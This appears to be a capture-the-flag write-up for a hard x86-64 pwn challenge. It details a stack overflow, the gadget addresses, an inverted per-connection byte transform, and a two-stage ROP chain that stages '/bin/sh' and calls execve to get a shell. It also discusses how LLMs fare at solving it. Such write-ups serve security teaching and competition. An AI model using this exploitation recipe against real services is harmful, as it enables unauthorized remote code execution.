<!-- nctf-meta category="pwn" difficulty="hard" points="500" author="ctf-2026" stub="0" -->

# ret2csu-ish

**Category:** pwn · **Difficulty:** hard · **Flag:** `NCTF{…}`

## TL;DR

Statically linked, no-PIE x86-64 binary with a plain stack overflow, no canary,
no win(). Build a ROP chain that:

1. `read(0, scratch, 16)` to stage the string `"/bin/sh\0"` into a fixed `.bss`
   buffer (the static image contains no `/bin/sh` string), then
2. `execve(scratch, 0, 0)` to pop a shell in the live service.

Two obstacles beyond a textbook static ROP:

- **No `/bin/sh` string** anywhere in the binary → stage it yourself.
- A **per-connection additive transform** on every byte you send:
  `stack[i] = (input[i] + K) mod 256`, where `K` (the "landing key") is printed
  fresh each connection. Read `K` and pre-image the whole chain by sending
  `(target − K) mod 256` for every byte. A recorded/replayed chain is worthless.

The flag is only in the running service (per-team, in the process environment
and in `/tmp/flag.txt`, both runtime-only). You get it by executing code — the
shell reads it. Nothing in the downloadable binary is a real flag.

## Recon

```
$ file chall
chall: ELF 64-bit LSB executable, x86-64, statically linked, not stripped
$ checksec chall
    Arch:     amd64-64-little
    RELRO:    Partial
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Static + NX + no canary + no PIE ⇒ classic ROP-to-syscall. `nm chall` shows the
intended gadgets are even named:

```
csu_pop        pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
marshal_regs   mov rdi, r13 ; mov rsi, r14 ; mov rdx, r15 ; ret
syscall_ret    syscall ; ret
scratch        writable .bss buffer, fixed address
```

`csu_pop` + `marshal_regs` are the "ret2csu-ish" pair: modern glibc (≥ 2.34) no
longer ships `__libc_csu_init`, so the binary reintroduces the equivalent
argument-marshalling primitive. Load `r13/r14/r15` with `csu_pop`, then
`marshal_regs` copies them into `rdi/rsi/rdx` in one shot. `pop rax ; ret` for
the syscall number is an incidental gadget inside the static glibc
(`ROPgadget --binary chall | grep 'pop rax ; ret'`).

## The overflow offset

`vuln()` (compiled `noinline`) has this frame:

```
push rbp ; push rbx ; sub rsp, 0x58
...
lea rsi, [rsp+0x10]          ; buf
mov edx, 0x200
call read                    ; read(0, buf, 0x200)   <-- overflow
...
add [rdx], bl                ; the per-byte transform: byte += key
...
add rsp, 0x58 ; pop rbx ; pop rbp ; ret
```

`buf` is at `rsp+0x10`. The saved return address is at
`rsp + 0x58 + 8 (rbx) + 8 (rbp) = rsp + 0x68`, so the distance from `buf` to the
saved RIP is `0x68 − 0x10 = 0x58 = 88` bytes.

## The per-connection transform

After the `read`, the program does, for `i` in `[0, n)`:

```
buf[i] = (unsigned char)(buf[i] + key);
```

`key` is printed as `landing key: 0xNN`. To make the byte `T` appear on the
stack you must send `(T − key) mod 256`. Because `read()` is used (not `gets`),
there are **no** bad bytes — `\x00` and `\n` are fine — so pre-imaging is a
straight bytewise subtraction over the entire chain.

## The chain

Offsets/addresses are read from the shipped binary (the solver resolves them
dynamically, so it survives a rebuild):

```
pad          "A" * 88
# stage 1: read(0, scratch, 16)
csu_pop; rbx; rbp; r12; r13=0; r14=scratch; r15=16
marshal_regs                 # rdi=0, rsi=scratch, rdx=16
pop_rax; 0                   # SYS_read
syscall_ret
# stage 2: execve(scratch, 0, 0)
csu_pop; rbx; rbp; r12; r13=scratch; r14=0; r15=0
marshal_regs                 # rdi=scratch, rsi=0, rdx=0
pop_rax; 59                  # SYS_execve
syscall_ret
```

Send `preimage(chain, key)`. Then, in a **separate** send (so the first
`read()` returns before these bytes arrive, otherwise `"/bin/sh"` gets slurped
into the wrong `read`), send `"/bin/sh\0"` padded to 16 bytes. That satisfies
stage 1's `read`, stage 2 `execve`s it, and you have a shell.

Note `execve(path, argv, envp)` with `envp = 0` clears the environment, so the
shell's `$FLAG` is empty — that is why the service also writes the flag to the
runtime-only `/tmp/flag.txt`. `cat /tmp/flag.txt` (or `echo "$FLAG"` if you
choose to preserve `envp`) returns it.

## Run it

```
# local
python3 solve.py

# remote instance
python3 solve.py <host> <port>
```

Verified locally and over a socat listener identical to the served
configuration; the solver reads a fresh landing key each run and recovers the
flag.

## Honest note on LLM assistance

This challenge does **not** claim to be unsolvable by a strong model — it is a
well-known technique family (static no-PIE ROP to `execve`), and a capable
assistant with pwntools will recognise it. Two design choices raise the bar and,
in particular, break single-prompt / naive-automation solves:

- **The per-connection additive transform.** `pwntools`' `ROP().chain()` or an
  `autorop`-style pipeline emits raw gadget addresses; feeding those directly
  fails, because the service adds `K` to every byte before it lands. The solver
  must (a) notice the transform from the source/banner and (b) invert it live
  per connection. A recorded successful payload never replays.
- **No `/bin/sh` string.** `rop.execve('/bin/sh', 0, 0)` has nothing to point
  at; the solver must reason that a static image lacks the string and stage it
  via a first `read` syscall into `.bss`. This is a small but real step that
  auto-ROP helpers do not do for you.

What an LLM does _well_ here: recognising the static-ROP-to-execve pattern,
listing the gadgets, computing the stack offset from the disassembly, and
writing the syscall chain. What trips it up: the additive transform (it will
often send an un-pre-imaged chain and get a silent crash), the missing
`/bin/sh` (it will assume the string exists), and the read-coalescing timing
between the chain and the staged string. A correct end-to-end solve therefore
requires the model to integrate the banner value into the payload construction
per connection rather than emitting one static exploit — which is exactly the
skill the server-side, per-connection design is meant to reward.

## Files

- `../chall.c` — source (documents the bug, the transform, and the gadgets)
- `../chall` — the built binary handed to players
- `solve.py` — working solver (local and remote)
- `requirements.txt` — `pwntools`
